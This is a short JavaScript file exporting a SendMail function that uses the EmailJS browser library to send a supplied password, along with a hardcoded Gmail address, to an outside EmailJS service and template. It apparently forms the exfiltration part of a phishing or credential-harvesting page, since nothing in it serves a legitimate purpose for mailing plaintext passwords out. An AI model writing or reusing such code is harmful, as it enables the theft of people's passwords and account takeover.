  import emailjs from '@emailjs/browser';


   /**
 * @param {string} pass
 */


   export function SendMail(pass) {

    emailjs
      .send("asiscan","template_mei0db8", {
        password: pass,
        email: "hehebobos@gmail.com",
        }, {
        publicKey: 'vGvH9vq_aIaVCEh1D',
      })

  };